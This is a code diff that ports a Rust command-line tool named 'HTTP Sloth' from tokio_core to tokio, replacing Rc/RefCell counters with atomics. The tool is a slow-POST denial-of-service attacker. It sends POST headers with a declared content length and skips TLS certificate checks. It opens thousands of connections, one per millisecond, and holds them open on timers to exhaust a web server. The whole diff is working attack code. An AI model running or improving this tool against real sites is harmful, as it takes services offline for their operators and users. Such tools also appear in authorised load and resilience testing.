@@ -1,8 +1,9 @@
 use std::io;
 use std::io::Write;
 use std::net::ToSocketAddrs;
-use std::cell::RefCell;
-use std::rc::Rc;
+use std::cell::Cell;
+use std::sync::Arc;
+use std::sync::atomic::{AtomicUsize, Ordering};
 use std::time::Duration;
 
 #[macro_use]
@@ -14,9 +15,12 @@ use futures::*;
 
 extern crate native_tls;
 
+extern crate tokio;
+use tokio::prelude::*;
+
 extern crate tokio_core;
 use tokio_core::reactor::Core;
-use tokio_core::net::TcpStream;
+use tokio::net::TcpStream;
 
 extern crate tokio_timer;
 use tokio_timer::*;
@@ -30,7 +34,7 @@ use url::Url;
 mod stream;
 use stream::MaybeHttpsStream;
 
-type BoxedMaybeHttps = Box<Future<Item = MaybeHttpsStream, Error = io::Error>>;
+type BoxedMaybeHttps = Box<Future<Item = MaybeHttpsStream, Error = io::Error> + Send>;
 
 fn main() {
     let arguments = App::new("HTTP Sloth")
@@ -64,30 +68,27 @@ fn main() {
     let interval = Duration::from_secs(value_t!(arguments, "interval", u64).unwrap_or(50));
     let max_connections_count: usize = value_t!(arguments, "connections-count", usize).unwrap_or(2048);
 
-    let mut core = Core::new().unwrap();
-    let handle = core.handle();
     let start = format!("POST {} HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\nHost: {}\r\nContent-Length: {}\r\n\r\n", path, host, content_length);
     let addr = parsed_url.to_socket_addrs().unwrap().next().unwrap();
     let mut tls_connector = native_tls::TlsConnector::builder();
     tls_connector.danger_accept_invalid_certs(true);
     let tls_connector = tls_connector.build().unwrap();
 
-    let live_connections = Rc::new(RefCell::new(0usize));
-    let connection_number = Rc::new(RefCell::new(0usize));
+    let live_connections = Arc::new(AtomicUsize::new(0));
+    let connection_number = AtomicUsize::new(0);
     let cycle = Interval::new_interval(Duration::from_millis(1)).for_each({
-        let live_connections = live_connections.clone();
-        let connection_number = connection_number.clone();
-        let handle = handle.clone();
+        let live_connections = Arc::clone(&live_connections);
+        // let connection_number = connection_number.clone();
         move |_| {
-            if *live_connections.borrow() >= max_connections_count { return Ok(()) };
-            *connection_number.borrow_mut() += 1;
-            let connection_number = *connection_number.borrow();
+            if live_connections.load(Ordering::Acquire) >= max_connections_count { return Ok(()) };
+            connection_number.fetch_add(1, Ordering::Acquire);
+            let connection_number = connection_number.load(Ordering::Acquire);
             let host = host.clone();
             let start = start.clone();
             let tls_connector = tls_connector.clone();
             let tls_connector = TlsConnector::from(tls_connector);
 
-            let socket = TcpStream::connect(&addr, &handle);
+            let socket = TcpStream::connect(&addr);
             let connector: BoxedMaybeHttps = if needs_tls {
                 Box::new(socket.and_then(move |socket| {
                     tls_connector
@@ -113,11 +114,11 @@ fn main() {
                         Ok(())
                     }).map_err(|e| { io::Error::new(io::ErrorKind::Other, format!("Timer error: {}", e)) })
                 });
-            *live_connections.borrow_mut() += 1;
-            handle.spawn(connection.map_err({
-                let live_connections = live_connections.clone();
+            live_connections.fetch_add(1, Ordering::Acquire);
+            tokio::spawn(connection.map_err({
+                let live_connections = Arc::clone(&live_connections);
                 move |e| {
-                    *live_connections.borrow_mut() -= 1;
+                    live_connections.fetch_sub(1, Ordering::Acquire);
                     println!("Connection: {} failed! Reason: {}", connection_number, e);
                 }
             }));
@@ -125,15 +126,14 @@ fn main() {
         }
     });
 
-    handle.spawn(cycle.map_err(move |e| println!("Cannot spawn connections cycle loop. Reason: {}", e)));
+    tokio::spawn(cycle.map_err(move |e| println!("Cannot spawn connections cycle loop. Reason: {}", e)));
     let print_interval = Duration::from_secs(5);
-    handle.spawn(
-        Interval::new_interval(print_interval).for_each(move |_| {
-            println!("Live Connections: {}", live_connections.borrow());
+    tokio::run(
+        Interval::new_interval(print_interval).for_each({
+            move |_| {
+            println!("Live Connections: {}", live_connections.load(Ordering::Acquire));
             Ok(())
-        })
+            }})
         .map_err(move |e| println!("Cannot spawn live connetions print task. Reason: {}", e))
     );
-    let empty: futures::Empty<(), ()> = future::empty();
-    let _core_started = core.run(empty);
 }
